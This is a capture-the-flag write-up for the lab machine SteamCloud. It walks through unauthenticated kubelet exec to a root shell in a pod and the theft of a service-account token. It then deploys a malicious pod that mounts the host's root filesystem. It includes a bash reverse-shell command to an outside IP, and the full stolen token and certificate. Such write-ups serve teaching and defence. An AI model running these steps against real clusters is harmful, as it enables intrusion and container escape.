# Nmap
```
nmap -sC -sV -Pn 10.10.11.133 -oN ./nmap.txt
# Nmap 7.95 scan initiated Wed Jul 16 16:27:04 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.133
Nmap scan report for 10.10.11.133
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
8443/tcp open  ssl/http Golang net/http server
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP SteamCloudAddress:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-07-15T06:21:25
|_Not valid after:  2028-07-15T06:21:25
|_http-title: Site doesn't have a title (application/json).
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: a0dd26e8-0ce0-4636-b3e2-29f4ee4f63bf
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: ab6ad61e-3124-47f8-a103-ec39d6d91770
|     X-Kubernetes-Pf-Prioritylevel-Uid: 6becbcee-2e1f-4f30-b815-910434f23aae
|     Date: Wed, 16 Jul 2025 06:32:28 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 6a0e76e8-99d2-4324-8669-e77089359d4c
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: ab6ad61e-3124-47f8-a103-ec39d6d91770
|     X-Kubernetes-Pf-Prioritylevel-Uid: 6becbcee-2e1f-4f30-b815-910434f23aae
|     Date: Wed, 16 Jul 2025 06:32:24 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 9d3d321e-ec6e-4f22-ab83-dcc61901c204
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: ab6ad61e-3124-47f8-a103-ec39d6d91770
|     X-Kubernetes-Pf-Prioritylevel-Uid: 6becbcee-2e1f-4f30-b815-910434f23aae
|     Date: Wed, 16 Jul 2025 06:32:26 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=7/16%Time=6877477B%P=aarch64-unknown-li
SF:nux-gnu%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2
SF:06a0e76e8-99d2-4324-8669-e77089359d4c\r\nCache-Control:\x20no-cache,\x2
SF:0private\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20ab6ad61e-3124-47f8-a
SF:103-ec39d6d91770\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x206becbcee-2e1f
SF:-4f30-b815-910434f23aae\r\nDate:\x20Wed,\x2016\x20Jul\x202025\x2006:32:
SF:24\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVe
SF:rsion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"for
SF:bidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x2
SF:0\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%
SF:r(HTTPOptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x209d3d32
SF:1e-ec6e-4f22-ab83-dcc61901c204\r\nCache-Control:\x20no-cache,\x20privat
SF:e\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20no
SF:sniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20ab6ad61e-3124-47f8-a103-ec3
SF:9d6d91770\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x206becbcee-2e1f-4f30-b
SF:815-910434f23aae\r\nDate:\x20Wed,\x2016\x20Jul\x202025\x2006:32:26\x20G
SF:MT\r\nContent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\"
SF::\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:
SF:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\
SF:\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(F
SF:ourOhFourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20a0d
SF:d26e8-0ce0-4636-b3e2-29f4ee4f63bf\r\nCache-Control:\x20no-cache,\x20pri
SF:vate\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20ab6ad61e-3124-47f8-a103-
SF:ec39d6d91770\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x206becbcee-2e1f-4f3
SF:0-b815-910434f23aae\r\nDate:\x20Wed,\x2016\x20Jul\x202025\x2006:32:28\x
SF:20GMT\r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersio
SF:n\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidd
SF:en:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\
SF:"/nice\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"det
SF:ails\":{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 16 16:33:25 2025 -- 1 IP address (1 host up) scanned in 381.84 seconds
```

# Port 8443
The service on 8443 has a bunch of information about the `TLS` certificate, which gives a bunch of names:
```
minikube/organizationName=system:masters
minikubeCA
control-plane.minikube.internal
kubernetes.default.svc.cluster.local
kubernetes.default.svc
kubernetes.default
kubernetes
localhost
10.10.11.133
10.96.0.1
127.0.0.1
10.0.0.1
```
Those all seem `Kubernetes-related`

```
Minikube is:
minikube quickly sets up a local Kubernetes cluster on macOS, Linux, and Windows. We proudly focus on helping application developers and new Kubernetes users.

Kubernetes is:
A portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. It has a large, rapidly growing ecosystem. Kubernetes services, support, and tools are widely available.
```

`TCP` 8443 is the default starting port for the API server in `minikube`. Visiting the service in Firefox returns an HTTP 403 with a `JSON` body:
![](images/Pasted%20image%2020250716164010.png)

The anonymous user can’t reach to `/`.

But we can use `kubectl` to interact with this service, but it just prompts for `auth`:
```
kubectl --server https://10.10.11.133:8443  get pod
Please enter Username: ^C

kubectl --server https://10.10.11.133:8443 get namespaces
Please enter Username: ^C
```

There is a tool similar to `kubectl` for managing `kubelet`, called `kubeletctl` . We can use it to list all pods on a node
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ /opt/kubeletctl pods -s 10.10.11.133
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ kube-proxy-q7gcn                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ coredns-78fcd69978-cjhx6           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘

```

The `runningpods` command gives a bunch of `JSON` about the running pods:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ /opt/kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
["storage-provisioner","kube-system"]
["kube-proxy-q7gcn","kube-system"]
["etcd-steamcloud","kube-system"]
["kube-controller-manager-steamcloud","kube-system"]
["kube-apiserver-steamcloud","kube-system"]
["kube-scheduler-steamcloud","kube-system"]
["nginx","default"]
["coredns-78fcd69978-cjhx6","kube-system"]
                                               
```

There’s only one `nginx` that’s not in the `kube-system` namespace.

# Shell as root by "Nginx"

By accessing the `kubelet` service, I can also run commands on the container. I will use the exec command in `kubeletctl` and pass in the name of the Pod (nginx) and the name of the container (nginx):
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ /opt/kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)
```

But I want to make a reverse shell to our local machine, I did not get
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ /opt/kubeletctl -s 10.10.11.133 exec "/bin/bash -i >& /dev/tcp/10.10.14.17/443 0>&1" -p nginx -c nginx
bash: >: No such file or directory
command terminated with exit code 127
```

However, it did have `bash`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ /opt/kubeletctl -s 10.10.11.133 exec "which bash" -p nginx -c nginx                                 
/bin/bash

```

So I would try it more easily
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ /opt/kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
root@nginx:/# 

```

We can get the shell directly.

# Privilege Escalation to pod Steamcloud
Now that we have successfully gained a shell in the `Nginx` pod, let’s see if we can get a token and credentials so we can create a service account with elevated privileges.

We can get something useful from `/var/run/secrets/kubernetes.io/serviceaccount`
```
root@nginx:/var/run/secrets/kubernetes.io/serviceaccount# ls -al
ls -al
total 4
drwxrwxrwt 3 root root  140 Jul 16 06:22 .
drwxr-xr-x 3 root root 4096 Jul 16 06:22 ..
drwxr-xr-x 2 root root  100 Jul 16 06:22 ..2025_07_16_06_22_02.533754616
lrwxrwxrwx 1 root root   31 Jul 16 06:22 ..data -> ..2025_07_16_06_22_02.533754616
lrwxrwxrwx 1 root root   13 Jul 16 06:22 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Jul 16 06:22 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Jul 16 06:22 token -> ..data/token
```

We can use these certificates to log into `Kubectl` and check what permissions we have. Save the certificate in a file called `ca.crt` and export the token as an environment variable.
```
ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----


token

eyJhbGciOiJSUzI1NiIsImtpZCI6ImhOZ29PR0xVWGpYUmpSVmNnN0tWSU81T19Cd2Z3c1c3cTB3Z3AtcDVPVkEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzg0MTgyOTIyLCJpYXQiOjE3NTI2NDY5MjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjZlZDAyNGFjLTg5YzMtNDViOS05Mzk0LWIxMjU2Y2E4ZDIyZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjgzNzJjZDFmLWUwNWMtNDJhNC1iNGQ3LTczMTY1MzljYmE5NyJ9LCJ3YXJuYWZ0ZXIiOjE3NTI2NTA1Mjl9LCJuYmYiOjE3NTI2NDY5MjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Q11E9x-gjZ8LSw24estAinmCtr-QzjCAvBBYjdpNIE21BeJoNHUjxnzUuaiZGwMVLUak1pO44i6ThJIA5Dz9C4i24rrXAmgVgHP3oTJ8x6hrwbTWYdlbnHOGOtqol4AOl7duSlkVroo591mGWKfdihQ97-yAf_NuQ_PKagGkodlYu3eHc3Aq704BM0t_e3ouFkWkbZxs_snIkIgwmB1Bh3WSNGB59SRCLQT9TgvvGmK_60sET7rtNxlVY2uEfI2JMRgkgiIyb9oI1XQPbNgrBg7M1YTz2Ilb51dYspFBTYvzJXV5T8z5ioat6l__gs_cey7T8UhfsLoWnYNNXCSogg
```

Let's check what pods can be access
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ export token="eyJhbGciOiJSUzI1NiIsImtpZCI6ImhOZ29PR0xVWGpYUmpSVmNnN0tWSU81T19Cd2Z3c1c3cTB3Z3AtcDVPVkEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzg0MTgyOTIyLCJpYXQiOjE3NTI2NDY5MjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjZlZDAyNGFjLTg5YzMtNDViOS05Mzk0LWIxMjU2Y2E4ZDIyZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjgzNzJjZDFmLWUwNWMtNDJhNC1iNGQ3LTczMTY1MzljYmE5NyJ9LCJ3YXJuYWZ0ZXIiOjE3NTI2NTA1Mjl9LCJuYmYiOjE3NTI2NDY5MjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Q11E9x-gjZ8LSw24estAinmCtr-QzjCAvBBYjdpNIE21BeJoNHUjxnzUuaiZGwMVLUak1pO44i6ThJIA5Dz9C4i24rrXAmgVgHP3oTJ8x6hrwbTWYdlbnHOGOtqol4AOl7duSlkVroo591mGWKfdihQ97-yAf_NuQ_PKagGkodlYu3eHc3Aq704BM0t_e3ouFkWkbZxs_snIkIgwmB1Bh3WSNGB59SRCLQT9TgvvGmK_60sET7rtNxlVY2uEfI2JMRgkgiIyb9oI1XQPbNgrBg7M1YTz2Ilb51dYspFBTYvzJXV5T8z5ioat6l__gs_cey7T8UhfsLoWnYNNXCSogg"

┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          43m

```

The default service account appears to have some basic rights, so let's list them all using `auth can-i`.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]

```

We can get, list, and create Pods in the default namespace. To create a Pod, we can use the `Nginx` image. Let's create a Nefarious Pod. Save the following `YAML` configuration in a file called `evil.yaml`.
```
apiVersion: v1 
kind: Pod
metadata:
  name: wither-pod
  namespace: default
spec:
  containers:
  - name: wither-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Then we can use `kubectl apply` to start the pod
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ kubectl apply -f evil.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
pod/wither-pod created
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ kubectl get pod --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
NAME         READY   STATUS    RESTARTS   AGE
nginx        1/1     Running   0          49m
wither-pod   1/1     Running   0          39s

```

Our Pod is good, up and running. Now we can move on to getting the user and root flags.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/SteamCloud]
└─$ /opt/kubeletctl -s 10.10.11.133 exec "/bin/bash" -p wither-pod -c wither-pod
root@steamcloud:/# cd /mnt
cd /mnt
root@steamcloud:/mnt# ls
ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
root@steamcloud:/mnt# cd root
cd root
root@steamcloud:/mnt/root# ls
ls
root.txt
```


# Description

This machine mainly examines the use and enumeration of Kubelet services. At the same time, the use can create and generate a malicious Pod, and then use Kubectl to run commands in the Pod to read the root flag.